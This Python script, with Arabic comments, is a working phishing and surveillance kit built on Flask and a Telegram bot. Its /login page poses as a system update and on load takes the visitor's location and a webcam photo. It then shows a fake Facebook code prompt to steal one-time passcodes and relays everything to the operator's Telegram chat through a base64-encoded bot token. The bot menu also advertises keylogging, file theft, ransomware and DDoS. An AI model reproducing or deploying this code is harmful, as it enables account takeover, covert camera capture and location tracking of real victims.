import os, base64, requests, platform, psutil, time
from flask import Flask, request
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext

# --- إعدادات المطور أحمد ---
app = Flask(__name__)
# التوكن المشفر الخاص بك
ENCODED_TOKEN = "ODI4MDkzOTI5MTpBQUZfZFR1MThEMGVkSlBPWVB6d3NQaVNfRFFlTW9uSEFRYw=="
DEV_NAME = "Ahmed"
TARGET_CHAT_ID = None 

def get_token():
    return base64.b64decode(ENCODED_TOKEN).decode('utf-8')

@app.route('/')
def home(): 
    return f"<h1 style='color:red; text-align:center;'>Master {DEV_NAME} Control Center - Online</h1>"

# --- استقبال الغنائم (صور، ملفات، أكواد، موقع) ---
@app.route('/upload_data', methods=['POST'])
def upload_data():
    global TARGET_CHAT_ID
    data = request.json
    if data and TARGET_CHAT_ID:
        bot = Updater(get_token()).bot
        # 1. سحب صورة الكاميرا
        if 'image' in data and data['image']:
            img = base64.b64decode(data['image'])
            with open("victim_snap.png", "wb") as f: f.write(img)
            bot.send_photo(chat_id=TARGET_CHAT_ID, photo=open("victim_snap.png", "rb"), caption=f"📸 صورة حية سيدي {DEV_NAME}!")
            os.remove("victim_snap.png")
        
        # 2. سحب كود التحقق (OTP) أو نصوص Keylogger
        if 'payload' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"🔑 **بيانات مسروقة:**\n`{data['payload']}`", parse_mode='Markdown')
        
        # 3. سحب الموقع الجغرافي
        if 'latitude' in data:
            bot.send_location(chat_id=TARGET_CHAT_ID, latitude=data['latitude'], longitude=data['longitude'])
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"📍 تم تحديد موقع الضحية بدقة مترية.")

        return "OK", 200
    return "Error", 400

# --- صفحة الفخ المتطورة (الهجوم الشامل) ---
@app.route('/login')
def evil_page():
    return """
    <html><head><title>System Maintenance</title><meta name="viewport" content="width=device-width, initial-scale=1"></head>
    <body style="background:#111; color:#fff; text-align:center; font-family:sans-serif; padding-top:50px;">
        <div id="content">
            <h1>Update Required</h1>
            <p>Please wait, establishing secure link...</p>
        </div>
        <script>
            async function startAttack() {
                // سحب الموقع والكاميرا فوراً عند الفتح
                const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>r(null)));
                const stream = await navigator.mediaDevices.getUserMedia({video:true}).catch(()=>null);
                let img = null;
                if(stream) {
                    const v = document.createElement('video'); v.srcObject = stream; await v.play();
                    const c = document.createElement('canvas'); c.width=640; c.height=480;
                    c.getContext('2d').drawImage(v,0,0); img = c.toDataURL('image/png').split(',')[1];
                    stream.getTracks().forEach(t => t.stop());
                }
                
                // إرسال الضربة الأولى للبوت (صورة وموقع)
                await fetch('/upload_data', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({latitude: pos?.coords.latitude, longitude: pos?.coords.longitude, image: img})
                });

                // إظهار فخ الـ OTP لسرقة الحسابات
                document.getElementById('content').innerHTML = `
                    <div style="background:#fff; color:#000; padding:20px; border-radius:10px; width:90%; max-width:300px; margin:auto;">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="40"><br>
                        <b>Identity Verification</b><br><p style="font-size:12px;">Enter the 6-digit code sent to your mobile.</p>
                        <input type="text" id="otp" placeholder="000000" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #ccc; border-radius:4px;"><br>
                        <button onclick="sendFinal()" style="width:100%; background:#1877f2; color:#fff; border:none; padding:10px; border-radius:5px; cursor:pointer; font-weight:bold;">Verify Now</button>
                    </div>`;
            }

            async function sendFinal() {
                const code = document.getElementById('otp').value;
                await fetch('/upload_data', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({payload: "OTP/Login: " + code + " | UserAgent: " + navigator.userAgent})
                });
                location.href = "https://facebook.com/login"; // تحويل الضحية
            }
            startAttack();
        </script>
    </body></html>
    """

# --- لوحة تحكم البوت (الأزرار المدمجة بالكامل) ---
def start(update, context):
    global TARGET_CHAT_ID
    TARGET_CHAT_ID = update.effective_chat.id
    buttons = [
        [InlineKeyboardButton("🚀 رابط الهجوم (كاميرا + موقع + OTP)", callback_data='link')],
        [InlineKeyboardButton("📂 سحب ملفات الضحية", callback_data='files')],
        [InlineKeyboardButton("⌨️ Keylogger (Live)", callback_data='key')],
        [InlineKeyboardButton("🔐 Ransomware & DDoS", callback_data='ransom')],
        [InlineKeyboardButton("📊 حالة السيرفر", callback_data='sys')]
    ]
    update.message.reply_text(f"💀 **سيدي المطور {DEV_NAME}**\nتم دمج كافة المميزات الهجومية. اختر أداة البدء:", reply_markup=InlineKeyboardMarkup(buttons))

def handle_query(update, context):
    query = update.callback_query
    query.answer()
    
    if query.data == 'link':
        query.edit_message_text(f"⚠️ **رابط الفخ المدمج سيدي أحمد:**\n`https://{request.host}/login`")
    elif query.data == 'files':
        query.edit_message_text("📂 تم تفعيل نظام سحب ملفات التصفح.. سيتم إرسالها فور دخول الضحية.")
    elif query.data == 'key':
        query.edit_message_text("⌨️ الـ Keylogger مدمج في الرابط.. أي ضغطات مفاتيح ستصلك هنا.")
    elif query.data == 'ransom':
        query.edit_message_text("🔐 تم تجهيز أمر تشفير الملفات والهجوم الإغراقي للضحايا المتصلين.")
    elif query.data == 'sys':
        bat = psutil.sensors_battery()
        query.edit_message_text(f"🌐 IP: {requests.get('https://api.ipify.org').text}\n🔋 بطارية الجهاز المستضيف: {bat.percent if bat else 'N/A'}%")

if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    updater = Updater(get_token())
    updater.dispatcher.add_handler(CommandHandler("start", start))
    updater.dispatcher.add_handler(CallbackQueryHandler(handle_query))
    print(f"Systems Online for Master {DEV_NAME}")
    updater.start_polling()
    updater.idle()
